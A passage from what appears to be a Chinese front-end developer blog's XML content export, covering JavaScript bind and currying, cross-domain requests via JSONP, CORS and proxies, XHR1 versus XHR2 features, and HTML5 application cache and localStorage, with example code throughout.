这样就可以得到预期的结果，这个解决方案在onclick程序内部使用一个闭包直接调用handler.handlerFun()方法，当然这是特定于此场景的解决方案，创建多个闭包可能会令代码难以理解和调试。 自定义bind函数123456function bind(fn,context)&#123; return function()&#123; return fn.apply(context,arguments); &#125;;&#125;document.getElementById('btnTest').onclick=bind(handler.handlerFun,handler); 通过自定义的bind函数可以将函数绑定到指定环境，bind()函数接收两个参数：一个绑定函数，一个执行环境，并返回一个在执行环境中调用绑定函数的函数。看起来很简单，但是其功能很强大，在bing()中创建了一个闭包，闭包使用apply()调用传入的函数，并给apply()传入执行环境和参数，这里的arguments是内部匿名函数的，而非bind()的。当调用返回的函数时，它会在给定的函数中执行被传入的函数，并给出所有参数。上面例子的调用handler.handlerFun依旧可以得到参数event，因为所有参数在都通过绑定的函数传递给它了。在ES6中，直接为所有函数定义了一个原生的bind()函数123456789101112&lt;body&gt;&lt;input id="btnTest" type="button" value="Button"/&gt; &lt;script type="text/javascript"&gt; var handler=&#123; message:"Event handled.", handlerFun:function()&#123; alert(this.message); &#125; &#125;; document.getElementById('btnTest').onclick=handler.handlerFun.bind(handler); &lt;/script&gt;&lt;/body&gt; 函数柯里化百科的解释： 在计算机科学中，柯里化（英语：Currying），又译为卡瑞化或加里化，是把接受多个参数的函数变换成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数而且返回结果的新函数的技术。这个技术由 Christopher Strachey 以逻辑学家哈斯凯尔·加里命名的，尽管它是 Moses Schönfinkel 和 Gottlob Frege 发明的。 最常见的实现12345678function curry(fn) &#123; var args = Array.prototype.slice.call(arguments,1); return function() &#123; var innerArgs = Array.prototype.slice.call(arguments); var finalArgs = args.concat(innerArgs); return fn.apply(null,finalArgs); &#125;;&#125; 最常见的应用12345678910111213141516171819202122function square(i) &#123; return i * i;&#125;function dubble(i) &#123; return i *= 2;&#125;function map(handeler, list) &#123; return list.map(handeler);&#125;// 数组的每一项平方map(square, [1, 2, 3, 4, 5]);map(square, [6, 7, 8, 9, 10]);map(square, [10, 20, 30, 40, 50]);// ......// 数组的每一项加倍map(dubble, [1, 2, 3, 4, 5]);map(dubble, [6, 7, 8, 9, 10]);map(dubble, [10, 20, 30, 40, 50]); 例子中，创建了一个map通用函数，用于适应不同的应用场景。显然，通用性不用怀疑。同时，例子中重复传入了相同的处理函数：square和dubble。那么我们来用柯里化改造一下：12345678910111213141516171819202122function square(i) &#123; return i * i;&#125;function dubble(i) &#123; return i *= 2;&#125;function map(handeler, list) &#123; return list.map(handeler);&#125;var mapSQ = curry(map, square);mapSQ([1, 2, 3, 4, 5]);mapSQ([6, 7, 8, 9, 10]);mapSQ([10, 20, 30, 40, 50]);// ......var mapDB = curry(map, dubble);mapDB([1, 2, 3, 4, 5]);mapDB([6, 7, 8, 9, 10]);mapDB([10, 20, 30, 40, 50]); 我们缩小了函数的适用范围，但同时提高函数的适性。 将柯里化与函数绑定进行结合函数柯里化通常作为函数绑定的一部分包含在其中，构造出更为复杂的bind函数。例如：12345678function bind(fn, context) &#123; var args = Array.prototype.slice.call(arguments,2); return function() &#123; var innerArgs = Array.prototype.slice.call(arguments); var finalArgs = args.concat(innerArgs); return fn.apply(context,finalArgs); &#125;;&#125; ES6中的bind函数也实现了柯里化，只需要在this值之后传入另一个参数即可。123456789101112&lt;body&gt;&lt;input id="btnTest" type="button" value="Button"/&gt; &lt;script type="text/javascript"&gt; var handler=&#123; message:"Event handled.", handlerFun:function(name, event)&#123; alert(this.message + ":" + name + ":" + event.type); &#125; &#125;; document.getElementById('btnTest').onclick=handler.handlerFun.bind(handler, "btnTest"); &lt;/script&gt;&lt;/body&gt;]]></content>
      <categories>
        <category>JS高级程序设计</category>
      </categories>
      <tags>
        <tag>函数绑定</tag>
        <tag>函数柯里化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试系列（四）：浏览器跨域访问的实现]]></title>
    <url>%2Fcross-domain%20in%20browser.html</url>
    <content type="text"><![CDATA[为什么要实现跨域-同源策略的影响一个页面的脚本只能获取这个页面相同源或者相同域的数据，同源指的是协议（例如http、https）、域名（例如www.baidu.com或者主机名例如localhost）、端口号（例如8080端口）都相同。 一、JSONP原理：我们知道，在页面上有三种资源是可以与页面本身不同源的。它们是：js脚本，css样式文件，图片，像taobao等大型网站，很定会将这些静态资源放入cdn中，然后在页面上连接，如下所示，所以它们是可以链接访问到不同源的资源的。 &lt;script type=&quot;text/javascript&quot; src=&quot;某个cdn地址&quot; &gt;&lt;/script&gt; &lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;某个cdn地址&quot; /&gt; &lt;img src=&quot;某个cdn地址&quot; alt=&quot;&quot;/&gt; 而jsonp就是利用了&lt;script&gt;标签可以链接到不同源的js脚本，来到达跨域目的。当链接的资源到达浏览器时，浏览器会根据他们的类型来采取不同的处理方式，比如，如果是css文件，则会进行对页面repaint，如果是img则会将图片渲染出来，如果是script脚本，则会进行执行，比如我们在页面引入了jquery库，为什么就可以使用$了呢？就是因为jquery库被浏览器执行之后，会给全局对象window增加一个属性$，所以我们才能使用$来进行各种处理。（另外为什么要一般要加css放在头部，而js脚本放在body尾部呢，就是为了减少repaint的次数，另外因为js引擎是单线程执行，如果将js脚本放在头部，那么在js引擎在执行js代码时，会造成页面暂停。）利用页面上&lt;script&gt;标签可以跨域，并且其src指定的js脚本到达浏览器会执行的特性，我们可以进行跨域取得数据。具体实现的例子：JS中有三种写法 1、原生JS12345678var url = "http://localhost:8080/crcp/rcp/t99eidt/testjson.do?jsonp=callbackfunction";var script = document.createElement('script');script.setAttribute('src', url); //load javascriptdocument.getElementsByTagName('head')[0].appendChild(script);//回调函数function callbackfunction(data)&#123; var html=JSON.stringify(data.RESULTSET); alert(html); 2、jquery12345678$(function()&#123; jQuery.getJSON("http://localhost:8080/crcp/rcp/t99eidt/testjson.do?jsonp=?",function(data)&#123; var html=JSON.stringify(data.RESULTSET);$("#testjsonp").html(html);&#125; );&#125;); 3、jquery中的ajax12345678910111213 $.ajax(&#123;type:"GET",async :false,url:"http://localhost:8080/crcp/rcp/t99eidt/testjson.do",dataType:"jsonp",success:function(data)&#123;var html=JSON.stringify(data.RESULTSET);$("#testjsonp").html(html);&#125;,error:function()&#123;alert("error");&#125;&#125;); 注意：这种形式，默认的参数就是callback。后台代码中获取calback的值：String cb=request.getParameter(&quot;callback&quot;);并且生成的回调函数，默认也是类似json180068132068616一大串数字。根据Ajax手册：链接在此,我们可以更改callback名称以及回调函数名称。在jsonp中重写回调函数的名字。这个值用来替代在&quot;callback=?&quot;这种GET或POST请求中URL参数里的callback部分，比如设置jsonp:jsonp则请求的地址为：http://localhost:8080/testjson.do?jsonp=自动生成回调函数名此外还可以为jsonp请求指定一个回调函数名。这个值将用来取代jQuery自动生成的随机函数名。这主要用来让jQuery生成独特的函数名，这样管理请求更容易，也能方便地提供回调函数和错误处理。你也可以在想让浏览器缓存GET请求的时候，指定这个回调函数名。如：jsonpCallback:callbackfunction,则请求的地址为：http://localhost:8080/testjson.do?jsonp=callbackfunction 服务器端：主要工作就是拼接字符串，最简单的核心代码代码：123callback = Request["callback"]string data = "1024"Response.Write(callback + "(" + data + ")") 此时如果前端是像src=&#39;http://b.com/data.aspx?callback=myFn&#39;这样调用的话，从服务器端返回的就是myFn(1024)。 常用场景：8080端口定义一个servlet：123456789101112131415161718192021222324252627282930313233343536373839package com.tz.servlet;import java.io.IOException;import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import com.alibaba.fastjson.JSON;@WebServlet("/JsonServlet")public class JsonServlet extends HttpServlet &#123; private static final long serialVersionUID = 4335775212856826743L; protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; String callbackfun = request.getParameter("mycallback"); System.out.println(callbackfun); // callbackFun response.setContentType("text/json;charset=utf-8"); User user = new User(); user.setName("yuanfang"); user.setAge(100); Object obj = JSON.toJSON(user); System.out.println(user); // com.tz.servlet.User@164ff87 System.out.println(obj); // &#123;"age":23,"name":"chenkaixin"&#125; callbackfun += "(" + obj + ")"; System.out.println(callbackfun); // callbackFun(&#123;"age":23,"name":"chenkaixin"&#125;) response.getWriter().println(callbackfun); &#125; protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; this.doPost(request, response); &#125;&#125; 8888端口中的jsonp.html来跨域访问：1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;meta name="keywords" content="jsonp"&gt; &lt;meta name="description" content="jsonp"&gt; &lt;title&gt;jsonp&lt;/title&gt; &lt;style type="text/css"&gt; *&#123;margin:0;padding:0;&#125; div&#123;width:600px;height:100px;margin:20px auto;&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt; &lt;a href="javascript:;"&gt;jsonp测试&lt;/a&gt; &lt;/div&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.js"&gt;&lt;/script&gt;&lt;script type="text/javascript"&gt;function callbackFun(data)&#123; console.log(111); console.log(data.name); //data.age = 10000000; //alert(0000);&#125;$(function()&#123; $("a").on("click", function()&#123; $.ajax(&#123; type:"post", url:"http://localhost:8080/html5/JsonServlet", dataType:'jsonp', jsonp:'mycallback', jsonpCallback:'callbackFun', success:function(data) &#123; console.log(2222); console.log(data.age); &#125; &#125;); &#125;)&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 控制台输出结果：111 陈凯鑫 2222 100我们看到，我们成功的跨域取到了servlet中的数据，而且在我们指定的回调函数jsonpCallback:’callbackFun’ 和 sucess 指定的回调函数中都进行了执行。而且总是callbackFun先执行，如果我们打开注释：//data.age = 10000000; //alert(0000);就会发现：在callbackFun中对 data 进行修改之后，success指定的回调函数的结果也会发生变化，而且通过alert(0000)，我们确定了如果alert(000)没有执行完，success指定的函数就不会开始执行，就是说两个回调函数是先后同步执行的。 二、CORSCORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。 两种请求浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。只要同时满足以下两大条件，就属于简单请求。（1) 请求方法是以下三种方法之一： HEAD GET POST （2）HTTP的头信息不超出以下几种字段： Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain 凡是不同时满足上面两个条件，就属于非简单请求。浏览器对这两种请求的处理，是不一样的。 简单请求对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。123456GET /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... 上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。1234Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8 上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。（1）Access-Control-Allow-Origin该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个，表示接受任意域名的请求。（2）Access-Control-Allow-Credentials该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。（3）Access-Control-Expose-Headers该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(‘FooBar’)可以返回FooBar字段的值。*withCredentials 属性上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。Access-Control-Allow-Credentials: true另一方面，开发者必须在AJAX请求中打开withCredentials属性。12var xhr = new XMLHttpRequest();xhr.withCredentials = true; 否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。xhr.withCredentials = false;需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。 非简单请求预检请求非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。下面是一段浏览器的JavaScript脚本。12345var url = 'http://api.alice.com/cors';var xhr = new XMLHttpRequest();xhr.open('PUT', url, true);xhr.setRequestHeader('X-Custom-Header', 'value');xhr.send(); 上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。12345678OPTIONS /cors HTTP/1.1Origin: http://api.bob.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-HeaderHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... “预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。除了Origin字段，”预检”请求的头信息包括两个特殊字段。（1）Access-Control-Request-Method该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。（2）Access-Control-Request-Headers该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。预检请求的回应服务器收到”预检”请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。123456789101112HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderContent-Type: text/html; charset=utf-8Content-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain 上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。Access-Control-Allow-Origin: *如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。12XMLHttpRequest cannot load http://api.alice.com.Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. 服务器回应的其他CORS相关字段如下。1234Access-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderAccess-Control-Allow-Credentials: trueAccess-Control-Max-Age: 1728000 （1）Access-Control-Allow-Methods该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。（2）Access-Control-Allow-Headers如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。（3）Access-Control-Allow-Credentials该字段与简单请求时的含义相同。（4）Access-Control-Max-Age该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。浏览器的正常请求和回应一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。下面是”预检”请求之后，浏览器的正常CORS请求。1234567PUT /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comX-Custom-Header: valueAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... 上面头信息的Origin字段是浏览器自动添加的。下面是服务器正常的回应。12Access-Control-Allow-Origin: http://api.bob.comContent-Type: text/html; charset=utf-8 上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。 与JSONP的比较CORS与JSONP的使用目的相同，但是比JSONP更强大。JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。 三、使用后端的代理原理：前端A.html页面向同源下的服务器端的代理程序B.php发出AJAX请求，代理程序B.php向非同源下的服务器C发出请求，并获得请求结果，将结果返回给前端A.html。]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>ajax</tag>
        <tag>计算机网络基础</tag>
        <tag>JSONP</tag>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试系列（三）：新老AJAX（XHR1和XHR2）]]></title>
    <url>%2Fajax.html</url>
    <content type="text"><![CDATA[来来来，再来一个：-.-- --- ..- -....- .- .-. . -....- ... --- -....- -... . .- ..- - .. ..-. ..- .-.. 老AJAX工作原理通过XmlHttpRequest对象来向服务器发异步请求，从服务器获得数据，然后用javascript来操作DOM而更新页面。优点 页面无刷新，在页面内与服务器通信，用户体验非常好。 使用异步方式与服务器通信，不需要打断用户的操作，具有更加迅速的响应能力。 可以把以前一些服务器负担的工作转嫁到客户端，利用客户端闲置的能力来处理，减轻服务器和带宽的负担，节约空间和宽带租用成本。并且减轻服务器的负担，AJAX的原则是“按需取数据”，可以最大程度的减少冗余请求，和响应对服务器造成的负担。 基于标准化的并被广泛支持的技术，不需要下载插件或者小程序。 缺点 AJAX干掉了back按钮，即对浏览器后退机制的破坏。后退按钮是一个标准的web站点的重要功能，但是它没法和js进行很好的合作。 安全问题。技术同时也对IT企业带来了新的安全威胁，AJAX技术就如同对企业数据建立了一个直接通道。这使得开发者在不经意间会暴露比以前更多的数据和服务器逻辑。AJAX的逻辑可以对客户端的安全扫描技术隐藏起来，允许黑客从远端服务器上建立新的攻击。还有AJAX也难以避免一些已知的安全弱点，诸如跨站点脚步攻击、SQL注入攻击和基于credentials的安全漏洞等。 对搜索引擎的支持比较弱。 实例1、在js当中创建一个XHR（其中涉及兼容性处理）12345678var xhr = null;if (window.XMLHttpRequest) &#123; //所有现代浏览器(IE7+.Firefox.Chrome.Safari以及opera) xhr = new XMLHttpRequest;&#125;else&#123; //老版本的Internet Explorer使用ActiveX对象 xhr = new ActiveXObject("Microsoft.XMLHttp");&#125; 2.配置请求对象的信息123xhr.open('GET/POST','url地址',['是否异步']);注意：如果使用post请求,就一定要设置请求头xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded;charset=gb2312"); 3.发送请求1xhr.send([post请求参数字符串]); 发送请求分为两种情况: 监控用户的事件(onclick,onchange等),通过ajax发送请求 监控浏览器的事件(onload),通过ajax发送请求. 4.监听Ajax引擎对象的改变(是否正确做出了响应)123456xmlHttpRequest.onreadystatechange = function()&#123; if (xmlHttpRequest.readyState== 4 &amp;&amp; xmlHttpRequest==200) &#123; //xmlHttpRequest.responseText //xmlHttpRequest.responseText &#125;&#125; 知识拓展详解onreadystatechangeonreadystatechange属性是一个方法,监控到响应内容的返回,根据响应内容使用javascript改变当前页面的部分html代码,从而达到不刷新改变局部html代码.当Ajax引擎的状态发生改变时都会执行onreadystatechange属性对应的方法。详解Ajax引擎的状态属性readyState(0 1 2 3 4) 0.请求未初始化 1.服务器连接已建立 2.请求已接收 3.请求处理中 4.请求已完成,并且响应已就绪 当Ajax引擎的状态属性为readyState为4时,说明服务器的响应已经发送给Ajax请求了.但是响应的状态吗为200时:说明响应的内容是正确的,这时才会根据相应内容对当前页面的html处理 老版本的缺点 只支持文本数据的传送，无法用来读取和上传二进制文件。 传送和接收数据时，没有进度信息，只能提示有没有完成。 受到”同域限制”（Same Origin Policy），只能向同一域名的服务器请求数据。 新版本的功能 可以设置HTTP请求的时限。 可以使用FormData对象管理表单数据。 可以上传文件。 可以请求不同域名下的数据（跨域请求）。 可以获取服务器端的二进制数据。 可以获得数据传输的进度信息。 下面，我就简单介绍这些新功能。 HTTP请求的时限有时，ajax操作很耗时，而且无法预知要花多少时间。如果网速很慢，用户可能要等很久。新版本的XMLHttpRequest对象，增加了timeout属性，可以设置HTTP请求的时限。1xhr.timeout = 3000; 上面的语句，将最长等待时间设为3000毫秒。过了这个时限，就自动停止HTTP请求。与之配套的还有一个timeout事件，用来指定回调函数。123xhr.ontimeout = function(event)&#123; alert('请求超时！');&#125; 目前，Opera、Firefox和IE 10支持该属性，IE 8和IE 9的这个属性属于XDomainRequest对象，而Chrome和Safari还不支持。 FormData对象ajax操作往往用来传递表单数据。为了方便表单处理，HTML 5新增了一个formData对象，可以模拟表单。首先，新建一个FormData对象。1var formData = new FormData(); 然后，为它添加表单项。12formData.append('username', '张三');formData.append('id', 123456); 最后，直接传送这个FormData对象。这与提交网页表单的效果，完全一样。1xhr.send(formData); FormData对象也可以用来获取网页表单的值。12345var form = document.getElementById('myform');var formData = new FormData(form);formData.append('secret', '123456'); // 添加一个表单项xhr.open('POST', form.action);xhr.send(formData); 上传文件新版XMLHttpRequest对象，不仅可以发送文本信息，还可以上传文件。假定files是一个”选择文件”的表单元素input[type=&quot;file&quot;]，我们将它装入FormData对象。1234var formData = new FormData();for (var i = 0; i &lt; files.length;i++) &#123; formData.append('files[]', files[i]);&#125; 然后，发送这个FormData对象。1xhr.send(formData); 接收二进制数据（responseType属性）从服务器取回二进制数据，较新的方法是使用新增的responseType属性。如果服务器返回文本数据，这个属性的值是”TEXT”，这是默认值。较新的浏览器还支持其他值，也就是说，可以接收其他格式的数据。你可以把responseType设为blob，表示服务器传回的是二进制对象。123var xhr = new XMLHttpRequest();xhr.open('GET', '/path/to/image.png');xhr.responseType = 'blob'; 接收数据的时候，用浏览器自带的Blob对象即可。1var blob = new Blob([xhr.response], &#123;type: 'image/png'&#125;); 注意，是读取xhr.response，而不是xhr.responseText。你还可以将responseType设为arraybuffer，把二进制数据装在一个数组里。123var xhr = new XMLHttpRequest();xhr.open('GET', '/path/to/image.png');xhr.responseType = "arraybuffer"; 接收数据的时候，需要遍历这个数组。123456var arrayBuffer = xhr.response;if (arrayBuffer) &#123; var byteArray = new Uint8Array(arrayBuffer); for (var i = 0; i &lt; byteArray.byteLength; i++) &#123; // do something &#125;&#125; 进度信息新版本的XMLHttpRequest对象，传送数据的时候，有一个progress事件，用来返回进度信息。它分成上传和下载两种情况。下载的progress事件属于XMLHttpRequest对象，上传的progress事件属于XMLHttpRequest.upload对象。我们先定义progress事件的回调函数。12xhr.onprogress = updateProgress;xhr.upload.onprogress = updateProgress; 然后，在回调函数里面，使用这个事件的一些属性。12345function updateProgress(event) &#123; if (event.lengthComputable) &#123; var percentComplete = event.loaded / event.total; &#125;&#125; 上面的代码中，event.total是需要传输的总字节，event.loaded是已经传输的字节。如果event.lengthComputable不为真，则event.total等于0。与progress事件相关的，还有其他五个事件，可以分别指定回调函数： load事件：传输成功完成。 abort事件：传输被用户取消。 error事件：传输中出现错误。 loadstart事件：传输开始。 loadEnd事件：传输结束，但是不知道成功还是失败。]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>ajax</tag>
        <tag>XHR</tag>
        <tag>计算机网络基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试系列（二）：面试常问的几个HTML5特性]]></title>
    <url>%2Fnew%20features%20of%20html5.html</url>
    <content type="text"><![CDATA[来，有兴趣的破解个下面的摩斯电码：-.-- --- ..- -....- .- .-. . -....- .... .- -. ... --- -- . -....- . -. --- ..- --. .... 一、应用程序缓存（Application Cache）通过创建cache manifest文件来创建Web应用的离线版本使用方法：首先在页面声明中使用App Cache：12&lt;!DOCTYPE HTML&gt;&lt;html manifest="index.manifest"&gt; 然后再清单文件中写明资源，例如：12345678CACHE MANIFESTtheme.csslogo.gifmain.jsNETWORK:login.aspFALLBACK:/html5/ /404.html 代码解释： 首行必须是 CACHE MANIFEST。 其后，每一行列出一个需要缓存的资源文件名。 可根据需要列出在线访问的白名单。白名单中的所有资源不会被缓存，在使用时将直接在线访问。声明白名单使用 NETWORK：标识符。 如果在白名单后还要补充需要缓存的资源，可以使用 CACHE：标识符。 如果要声明某 URI 不能访问时的替补 URI，可以使用 FALLBACK：标识符。其后的每一行包含两个 URI，当第一个 URI 不可访问时，浏览器将尝试使用第二个 URI。 注释要另起一行，以 # 号开头。 更新缓存：应用程序可以等待浏览器自动更新缓存，也可以使用 Javascript 接口手动触发更新。 自动更新：浏览器除了在第一次访问 Web 应用时缓存资源外，只会在 cache manifest 文件本身发生变化时更新缓存。而 cache manifest 中的资源文件发生变化并不会触发更新。 手动更新：开发者也可以使用 window.applicationCache 的接口更新缓存。方法是检测 window.applicationCache.status的值，如果是 UPDATEREADY，那么可以调用 window.applicationCache.update()更新缓存。示范代码如下。 1234if (window.applicationCache.status == window.applicationCache.UPDATEREADY)｛ window.applicationCache.update();｝ 在线状态检测如果 Web 应用程序仅仅是一些静态页面的组合，那么通过 cache manifest 缓存资源文件以后，就可以支持离线访问了。但是随着互联网的发展，特别是 Web2.0 概念流行以来，用户的提交的数据渐渐成为互联网的主流。那么在开发支持离线的Web应用时，就不能仅仅满足于静态页面的展现，还必需考虑如何让用户在离线状态下也可以操作数据。离线状态时，把数据存储在本地；在线以后，再把数据同步到服务器上。为了做到这一点，开发者首先必须知道浏览器是否在线。HTML5提供了两种检测是否在线的方式：navigator.online 和 online/offline 事件。 navigator.onLine：navigator.onLine 属性表示当前是否在线。如果为 true, 表示在线；如果为 false,表示离线。当网络状态发生变化时，navigator.onLine 的值也随之变化。开发者可以通过读取它的值获取网络状态。 online/offline 事件：当开发离线应用时，通过 navigator.onLine 获取网络状态通常是不够的。开发者还需要在网络状态发生变化时立刻得到通知，因此 HTML5还提供了 online/offline 事件。当在线 / 离线状态切换时，online/offline 事件将触发在 body 元素上，并且沿着document.body、document 和 window 的顺序冒泡。因此，开发者可以通过监听它们的 online/offline事件来获悉网络状态。应用程序缓存的三个优势： 离线浏览：用户可在应用离线时使用它们 速度：已缓存资源加载得更快 减少服务器负载：浏览器将只从服务器下载更新过或更改过的资源。 存在的坑（导致应用不多） 使用了App Cache的页面在清单文件更新之后去更新页面资源，但是只在下次打开页面才能生效，这意味着，我们需要使用代码判断是不是最新版本，不是的话，刷新一次页面。这种体验很不好。 使用了App Cache的页面也会被缓存，这对于需要动态更新的页面来说，几乎是个噩梦。用户访问到的页面不是最新的，会导致非常多的问题。 App cache与browser cache混合在一起会使更新机制变得更加复杂，主要有以下几个因素: App cache在各浏览器平台实现上存在差异； 各浏览器又提供了不同的页面刷新机制； app cache还与传统的browser cache有着千丝万缕的联系；对于它俩如何协同工作，HTML5的相关规范没有对app cache的细节给出非常明确的规定; 浏览器官方文档有没有给出非常明确的说明。 browser cache的更新机制本身就已经很复杂。 如果manifest文件本身就有缓存时间，或设置为永远都可用，那你的网页永远都不会被更新了。 二、本地存储（Local Storage）本地存储是一个window的属性，包括localStorage和sessionStorage，从名字应该可以很清楚的辨认二者的区别，前者是一直存在本地的，后者只是伴随着session，窗口一旦关闭就没了。二者用法完全相同，这里以localStorage为例。大小大概为5M。比Cookie的4KB好得多。存储数据的方法就是给window.localStorage添加一个属性，属性都是以键值对的方式存在： 1234567localStorage.a = 3;//设置a为"3"localStorage["a"] = "sfsf";//设置a为"sfsf"，覆盖上面的值localStorage.setItem("b","isaac");//设置b为"isaac"var a1 = localStorage["a"];//获取a的值var a2 = localStorage.a;//获取a的值var b = localStorage.getItem("b");//获取b的值localStorage.removeItem("c");//清除c的值 推荐使用getItem()和setItem()，清除键值对使用removeItem()，一次性清除所有键值对使用clear()。此外还有key()方法在不知道有哪些键值的时候进行使用。Note: HTML5本地存储只能存字符串，任何格式存储的时候都会被自动转为字符串，所以读取的时候，需要自己进行类型的转换。 三、文件接口（File API）之前我们操作一个图片文件，都是先将图片上传到服务器端，然后再使用一个img标签指向到服务器的url地址，然后再进行一个使用第三方插件进行图片处理，而现在这一切都不需要服务器端了，因为FileReader对象提供的几个读取文件的方法变得异常简单，而且全部是客户端js的操作。简单的用法：HTML中定义一个src为空的img和value为空的textarea，以及一个type为file的input按钮，绑定一个点击事件readLocalFile()，然后在js中编写function 